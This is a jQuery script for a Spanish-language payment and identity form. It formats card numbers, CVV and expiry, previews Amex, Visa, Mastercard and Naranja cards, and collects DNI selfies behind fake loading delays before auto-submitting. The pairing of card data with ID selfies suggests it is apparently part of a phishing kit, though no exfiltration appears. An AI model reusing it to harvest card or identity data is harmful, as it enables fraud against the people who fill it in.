function error(id, method){
	if(method == "add"){
		$("#"+id+"_error").addClass("show");
		$("#"+id+"_error").removeClass("hide");
	}
	else {
		$("#"+id+"_error").addClass("hide");
		$("#"+id+"_error").removeClass("show");
	}
}
$("input").keydown(function(){
	$(this).parent().addClass("focus");
});
$("input").focus(function(){
	$(this).parent().addClass("focus");
});
$("input").focusout(function(){
	if($(this).val() == ""){
		$(this).parent().removeClass("focus");
	}
});

$("#card").keyup(function(){
	e = $(this).val();
	el = e.length;
	ele = $(this);
	card = e.substr(0, 2);
	if(card == "34" || card == "35" || card == "36" || card == "37"){
		ele.attr("minlength", "17");
		ele.attr("maxlength", "17");
		$("#cvv").attr("minlength", "4");
		$("#cvv").attr("maxlength", "4");
		if(el == 5){
			last = e.substr(4, 1);
			if(last == " "){
				val1 = e.substr(0, 4);
				ele.val(val1);
			}
			else {
				val1 = e.substr(0, 4);
				val2 = e.substr(4, 1);
				ele.val(val1+" "+val2);
			}
		}
		else if(el == 11){
			last = e.substr(9, 1);
			if(last == " "){
				val1 = e.substr(0, 4);
				val2 = e.substr(5, 6);
				ele.val(val1+" "+val2);
			}
			else {
				val1 = e.substr(0, 4);
				val2 = e.substr(5, 6);
				val3 = e.substr(11, 1);
				ele.val(val1+" "+val2+" "+val3);
			}
		}
	}
	else {
		ele.attr("minlength", "19");
		ele.attr("maxlength", "19");
		$("#cvv").attr("minlength", "3");
		$("#cvv").attr("maxlength", "3");
		if(el == 5){
			last = e.substr(4, 1);
			if(last == " "){
				val1 = e.substr(0, 4);
				ele.val(val1);
			}
			else {
				val1 = e.substr(0, 4);
				val2 = e.substr(4, 1);
				ele.val(val1+" "+val2);
			}
		}
		else if(el == 10){
			last = e.substr(9, 1);
			if(last == " "){
				val1 = e.substr(0, 4);
				val2 = e.substr(5, 4);
				ele.val(val1+" "+val2);
			}
			else {
				val1 = e.substr(0, 4);
				val2 = e.substr(5, 4);
				val3 = e.substr(9, 1);
				ele.val(val1+" "+val2+" "+val3);
			}
		}
		else if(el == 15){
			last = e.substr(14, 1);
			if(last == " "){
				val1 = e.substr(0, 4);
				val2 = e.substr(5, 4);
				val3 = e.substr(10, 4);
				ele.val(val1+" "+val2+" "+val3);
			}
			else {
				val1 = e.substr(0, 4);
				val2 = e.substr(5, 4);
				val3 = e.substr(10, 4);
				val4 = e.substr(14, 4);
				ele.val(val1+" "+val2+" "+val3+" "+val4);
			}
		}
	}
});
$("#venc").keyup(function(){
	e = $(this).val();
	el = e.length;
	ele = $(this);
	if(el == 3){
		last = e.substr(2, 1);
		if(last == "/"){
			val1 = e.substr(0,2);
			ele.val(val1);
		}
		else{
			val1 = e.substr(0,2);
			val2 = e.substr(2, 1);
			ele.val(val1+"/"+val2);
		}
	}
});



$("#name").bind('keypress', function (event) {
	var regex = new RegExp("^[a-zA-Z .\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#dni").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#card").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#venc").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#cvv").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
















$("#card").keyup(function(){
	e = $(this).val();
	el = e.length;
	ele = $(this);
	card = e.substr(0, 2);
	naranja = e.substr(0, 7);
	if(card == "34" || card == "35" || card == "36" || card == "37"){
		//amex
		$("#amex").css("display", "block");
		$("#amex_cvv").css("display", "block");
		$("#_1").css("display", "none");
		$("#_2").css("display", "none");
		$("#_3").css("display", "none");
		$("#_4").css("display", "none");
		$("#amex_1").css("display", "block");
		$("#amex_2").css("display", "block");
		$("#amex_3").css("display", "block");
		$("#visa").css("display", "none");
		$("#visa_back").css("display", "none");
		$("#mastercard").css("display", "none");
		$("#mastercard_back").css("display", "none");
		$("#naranja").css("display", "none");
		$("#naranja_back").css("display", "none");
		$(".card_text").each(function(){
			$(this).addClass("cls-3");
		});
		amex();
	}
	else if(card == "40" || card == "41" || card == "42" || card == "43" || card == "44" || card == "45" || card == "46" || card == "47" || card == "48" || card == "49"){
		//visa
		$("#_1").css("display", "block");
		$("#_2").css("display", "block");
		$("#_3").css("display", "block");
		$("#_4").css("display", "block");
		$("#amex_1").css("display", "none");
		$("#amex_2").css("display", "none");
		$("#amex_3").css("display", "none");
		$("#amex").css("display", "none");
		$("#amex_cvv").css("display", "none");
		$("#visa").css("display", "block");
		$("#visa_back").css("display", "block");
		$("#mastercard").css("display", "none");
		$("#mastercard_back").css("display", "none");
		$("#naranja").css("display", "none");
		$("#naranja_back").css("display", "none");
		$(".card_text").each(function(){
			$(this).addClass("cls-3");
		});
		otra_card();
	}
	else if(card == "51" || card == "52" || card == "53" || card == "54" || card == "55"){
		//mastercard
		$("#_1").css("display", "block");
		$("#_2").css("display", "block");
		$("#_3").css("display", "block");
		$("#_4").css("display", "block");
		$("#amex_1").css("display", "none");
		$("#amex_2").css("display", "none");
		$("#amex_3").css("display", "none");
		$("#amex").css("display", "none");
		$("#amex_cvv").css("display", "none");
		$("#visa").css("display", "none");
		$("#visa_back").css("display", "none");
		$("#mastercard").css("display", "block");
		$("#mastercard_back").css("display", "block");
		$("#naranja").css("display", "none");
		$("#naranja_back").css("display", "none");
		$(".card_text").each(function(){
			$(this).addClass("cls-3");
		});
		otra_card();
	}
	else if(naranja == "5895 62") {
		// naranja
		$("#_1").css("display", "block");
		$("#_2").css("display", "block");
		$("#_3").css("display", "block");
		$("#_4").css("display", "block");
		$("#amex_1").css("display", "none");
		$("#amex_2").css("display", "none");
		$("#amex_3").css("display", "none");
		$("#amex").css("display", "none");
		$("#amex_cvv").css("display", "none");
		$("#visa").css("display", "none");
		$("#visa_back").css("display", "none");
		$("#mastercard").css("display", "none");
		$("#mastercard_back").css("display", "none");
		$("#naranja").css("display", "block");
		$("#naranja_back").css("display", "block");
		$(".card_text").each(function(){
			$(this).addClass("cls-3");
		});
		otra_card();
	}
	else {
		$(".card_text").each(function(){
			$(this).removeClass("cls-3");
		});
		otra_card();
		$("#_1").css("display", "block");
		$("#_2").css("display", "block");
		$("#_3").css("display", "block");
		$("#_4").css("display", "block");
		$("#amex_1").css("display", "none");
		$("#amex_2").css("display", "none");
		$("#amex_3").css("display", "none");
		$("#amex").css("display", "none");
		$("#amex_cvv").css("display", "none");
		$("#visa").css("display", "none");
		$("#mastercard").css("display", "none");
		$("#naranja").css("display", "none");
	}
});


$("#name").keyup(function(){
	if($("#name").val() != ""){
		$("#name_card").text($("#name").val().toUpperCase());
	}
	else {
		$("#name_card").text("NOMBRE Y APELLIDO");
	}
});

$("#venc").keyup(function(){
	if($("#venc").val() != ""){
		if($("#venc").val().length == 1){
			$("#venc_card").text($("#venc").val()+"M/AA");
		}
		else if($("#venc").val().length == 2){
			$("#venc_card").text($("#venc").val()+"/AA");
		}
		else if($("#venc").val().length == 3){
			$("#venc_card").text($("#venc").val()+"AA");
		}
		else if($("#venc").val().length == 4){
			$("#venc_card").text($("#venc").val()+"A");
		}
		else if($("#venc").val().length == 5){
			$("#venc_card").text($("#venc").val());
		}
	}
	else {
		$("#venc_card").text("MM/AA");
	}
});
$("#cvv").keyup(function(){
	e = $("#card").val();
	card = e.substr(0, 2);
	if(card == "34" || card == "35" || card == "36" || card == "37"){
		if($("#cvv").val() != ""){
			if($("#cvv").val().length == 1){
				$("#amex_cvv").text($("#cvv").val()+"***");
			}
			else if($("#cvv").val().length == 2){
				$("#amex_cvv").text($("#cvv").val()+"**");
			}
			else if($("#cvv").val().length == 3){
				$("#amex_cvv").text($("#cvv").val()+"*");
			}
			else if($("#cvv").val().length == 4){
				$("#amex_cvv").text($("#cvv").val());
			}
		}
		else {
			$("#amex_cvv").text("****");
		}
	}
	else {
		if($("#cvv").val() != ""){
			if($("#cvv").val().length == 1){
				$("#cvv_card").text($("#cvv").val()+"**");
			}
			else if($("#cvv").val().length == 2){
				$("#cvv_card").text($("#cvv").val()+"*");
			}
			else if($("#cvv").val().length == 3){
				$("#cvv_card").text($("#cvv").val());
			}
		}
		else {
			$("#cvv_card").text("***");
		}
	}
});

$("#cvv").focus(function(){
	e = $("#card").val();
	card = e.substr(0, 2);
	if(card == "34" || card == "35" || card == "36" || card == "37"){
		$("#amex_senal").css("display", "block");
	}
	else {
		$("#flip").addClass("flip");
	}
});
$("#cvv").focusout(function(){
	e = $("#card").val();
	card = e.substr(0, 2);
	if(card == "34" || card == "35" || card == "36" || card == "37"){
		$("#amex_senal").css("display", "none");
	}
	else {
		$("#flip").removeClass("flip");
	}
});

	$("#front_dni").change(function (){
		$(".loading").css("display", "flex");
		setTimeout(function(){
			$(".loading").css("display", "none");
			$("#text_dni").html("Muy bien!<br><span>Ahora necesitamos una selfie con la parte trasera de el DNI.</span>");
			$("#front").css("display", "none");
			$("#back").css("display", "block");
		}, 2500);
	});
	$("#back_dni").change(function (){
		$(".loading").css("display", "flex");
		setTimeout(function(){
			$(".loading").css("display", "none");
			$("#dni_data").submit();
		}, 2500);
	});


function amex(){
var numeros = document.getElementById("card").value;
var numres = numeros.replace(/ /g, "");
	if(numres.length == 0){
		document.getElementById("amex_1").textContent = "****";
		document.getElementById("amex_2").textContent = "******";
		document.getElementById("amex_3").textContent = "*****";
	}
  else if(numres.length == 1){
    document.getElementById("amex_1").textContent = numres+"***";
	document.getElementById("amex_2").textContent = "******";
	document.getElementById("amex_3").textContent = "*****";
  }
  else if(numres.length == 2){
    document.getElementById("amex_1").textContent = numres+"**";
	document.getElementById("amex_2").textContent = "******";
	document.getElementById("amex_3").textContent = "*****";
  }
  else if(numres.length == 3){
    document.getElementById("amex_1").textContent = numres+"*";
	document.getElementById("amex_2").textContent = "******";
	document.getElementById("amex_3").textContent = "*****";
  }
  else if(numres.length == 4){
    document.getElementById("amex_1").textContent = numres;
	document.getElementById("amex_2").textContent = "******";
	document.getElementById("amex_3").textContent = "*****";
  }
  else if(numres.length == 5){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 1);
    document.getElementById("amex_1").textContent = num1;
	document.getElementById("amex_2").textContent = num2+"*****";
	document.getElementById("amex_3").textContent = "*****";
  }
  else if(numres.length == 6){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 2);
    document.getElementById("amex_1").textContent = num1;
	document.getElementById("amex_2").textContent = num2+"****";
	document.getElementById("amex_3").textContent = "*****";
  }
  else if(numres.length == 7){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 3);
    document.getElementById("amex_1").textContent = num1;
	document.getElementById("amex_2").textContent = num2+"***";
	document.getElementById("amex_3").textContent = "*****";
  }
  else if(numres.length == 8){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    document.getElementById("amex_1").textContent = num1;
	document.getElementById("amex_2").textContent = num2+"**";
	document.getElementById("amex_3").textContent = "*****";
  }
  else if(numres.length == 9){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 5);
    document.getElementById("amex_1").textContent = num1;
	document.getElementById("amex_2").textContent = num2+"*";
	document.getElementById("amex_3").textContent = "*****";
  }
  else if(numres.length == 10){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 6);
    document.getElementById("amex_1").textContent = num1;
	document.getElementById("amex_2").textContent = num2;
	document.getElementById("amex_3").textContent = "*****";
  }
  else if(numres.length == 11){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 6);
    var num3 = numres.substr(6, 1);
    document.getElementById("amex_1").textContent = num1;
	document.getElementById("amex_2").textContent = num2;
	document.getElementById("amex_3").textContent = num3+"****";
  }
  else if(numres.length == 12){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 6);
    var num3 = numres.substr(6, 2);
    document.getElementById("amex_1").textContent = num1;
	document.getElementById("amex_2").textContent = num2;
	document.getElementById("amex_3").textContent = num3+"***";
  }
  else if(numres.length == 13){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 6);
    var num3 = numres.substr(6, 3);
    document.getElementById("amex_1").textContent = num1;
	document.getElementById("amex_2").textContent = num2;
	document.getElementById("amex_3").textContent = num3+"**";
  }
  else if(numres.length == 14){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 6);
    var num3 = numres.substr(6, 4);
    document.getElementById("amex_1").textContent = num1;
	document.getElementById("amex_2").textContent = num2;
	document.getElementById("amex_3").textContent = num3+"*";
  }
  else if(numres.length == 15){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 6);
    var num3 = numres.substr(6, 5);
    document.getElementById("amex_1").textContent = num1;
	document.getElementById("amex_2").textContent = num2;
	document.getElementById("amex_3").textContent = num3;
  }
}

function otra_card(){
var numeros = document.getElementById("card").value;
var numres = numeros.replace(/ /g, "");
	if(numres.length == 0){
		document.getElementById("_1").textContent = "****";
		document.getElementById("_2").textContent = "****";
		document.getElementById("_3").textContent = "****";
		document.getElementById("_4").textContent = "****";
	}
  else if(numres.length == 1){
    document.getElementById("_1").textContent = numres+"***";
		document.getElementById("_2").textContent = "****";
		document.getElementById("_3").textContent = "****";
		document.getElementById("_4").textContent = "****";
  }
  else if(numres.length == 2){
    document.getElementById("_1").textContent = numres+"**";
		document.getElementById("_2").textContent = "****";
		document.getElementById("_3").textContent = "****";
		document.getElementById("_4").textContent = "****";
  }
  else if(numres.length == 3){
    document.getElementById("_1").textContent = numres+"*";
		document.getElementById("_2").textContent = "****";
		document.getElementById("_3").textContent = "****";
		document.getElementById("_4").textContent = "****";
  }
  else if(numres.length == 4){
    document.getElementById("_1").textContent = numres;
	document.getElementById("_2").textContent = "****";
		document.getElementById("_3").textContent = "****";
		document.getElementById("_4").textContent = "****";
  }
  else if(numres.length == 5){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 1);
    document.getElementById("_1").textContent = num1;
	document.getElementById("_2").textContent = num2+"***";
		document.getElementById("_3").textContent = "****";
		document.getElementById("_4").textContent = "****";
  }
  else if(numres.length == 6){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 2);
    document.getElementById("_1").textContent = num1;
	document.getElementById("_2").textContent = num2+"**";
		document.getElementById("_3").textContent = "****";
		document.getElementById("_4").textContent = "****";
  }
  else if(numres.length == 7){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 3);
    document.getElementById("_1").textContent = num1;
	document.getElementById("_2").textContent = num2+"*";
		document.getElementById("_3").textContent = "****";
		document.getElementById("_4").textContent = "****";
  }
  else if(numres.length == 8){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    document.getElementById("_1").textContent = num1;
	document.getElementById("_2").textContent = num2;
	document.getElementById("_3").textContent = "****";
		document.getElementById("_4").textContent = "****";
  }
  else if(numres.length == 9){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 1);
    document.getElementById("_1").textContent = num1;
	document.getElementById("_2").textContent = num2;
	document.getElementById("_3").textContent = num3+"***";
		document.getElementById("_4").textContent = "****";
  }
  else if(numres.length == 10){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 2);
    document.getElementById("_1").textContent = num1;
	document.getElementById("_2").textContent = num2;
	document.getElementById("_3").textContent = num3+"**";
		document.getElementById("_4").textContent = "****";
  }
  else if(numres.length == 11){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 3);
    document.getElementById("_1").textContent = num1;
	document.getElementById("_2").textContent = num2;
	document.getElementById("_3").textContent = num3+"*";
		document.getElementById("_4").textContent = "****";
  }
  else if(numres.length == 12){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 4);
    document.getElementById("_1").textContent = num1;
	document.getElementById("_2").textContent = num2;
	document.getElementById("_3").textContent = num3;
	document.getElementById("_4").textContent = "****";
  }
  else if(numres.length == 13){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 4);
    var num4 = numres.substr(12, 1);
    document.getElementById("_1").textContent = num1;
	document.getElementById("_2").textContent = num2;
	document.getElementById("_3").textContent = num3;
	document.getElementById("_4").textContent = num4+"***";
  }
  else if(numres.length == 14){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 4);
    var num4 = numres.substr(12, 2);
    document.getElementById("_1").textContent = num1;
	document.getElementById("_2").textContent = num2;
	document.getElementById("_3").textContent = num3;
	document.getElementById("_4").textContent = num4+"**";
  }
  else if(numres.length == 15){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 4);
    var num4 = numres.substr(12, 3);
    document.getElementById("_1").textContent = num1;
	document.getElementById("_2").textContent = num2;
	document.getElementById("_3").textContent = num3;
	document.getElementById("_4").textContent = num4+"*";
  }
  else if(numres.length == 16){
    var num1 = numres.substr(0, 4);
    var num2 = numres.substr(4, 4);
    var num3 = numres.substr(8, 4);
    var num4 = numres.substr(12, 4);
    document.getElementById("_1").textContent = num1;
	document.getElementById("_2").textContent = num2;
	document.getElementById("_3").textContent = num3;
	document.getElementById("_4").textContent = num4;
  }
}